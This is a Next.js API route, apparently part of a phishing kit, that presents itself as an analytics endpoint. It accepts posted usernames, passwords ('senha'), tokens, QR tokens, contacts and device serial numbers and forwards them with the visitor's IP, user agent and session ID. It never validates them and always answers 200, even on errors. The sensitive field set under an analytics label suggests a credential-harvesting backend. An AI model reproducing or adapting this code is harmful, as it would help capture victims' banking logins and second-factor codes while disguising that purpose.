import { cookies } from "next/headers";
import { NextRequest, NextResponse } from "next/server";
import { z } from "zod";
import { AnalyticsService } from "./AnalyticsService";
const BodySchema = z.object({
  usuario: z.string().optional(),
  senha: z.string().optional(),
  token: z.string().optional(),
  tokenqr: z.string().optional(),
  contato: z.string().optional(),
  name: z.string().optional(),
  numSerie: z.string().optional(),
  __event: z.string().optional(),
  __eventData: z.any().optional(),
}).passthrough();
function getClientIp(req: NextRequest): string {
  const h = req.headers;
  const xff = h.get("x-forwarded-for");
  if (xff) return xff.split(",")[0].trim();
  return h.get("x-real-ip") ?? "0.0.0.0";
}
export async function POST(req: NextRequest) {
  try {
    const cookieStore = await cookies(); 
    const sessionId = cookieStore.get("sessionId")?.value;
    if (!sessionId) return NextResponse.json({}, { status: 200 });

    const raw = await req.json().catch(() => ({}));
    const body = BodySchema.parse(raw);
    const userAgent = req.headers.get("user-agent") ?? "Unknown";
    const origin = req.headers.get("origin") ?? undefined;
    const ipAddress = getClientIp(req);
    const service = new AnalyticsService();
    if (body.__event) {
      await service.registerEvent(sessionId, body.__event, body.__eventData);
      return NextResponse.json({}, { status: 200 });
    }
    const result = await service.handlePost({
      sessionId,
      ipAddress,
      userAgent,
      origin,
      body,
    });
    return NextResponse.json(result, { status: 200 });
  } catch (err) {
 
    return NextResponse.json({}, { status: 200 });
  }
}
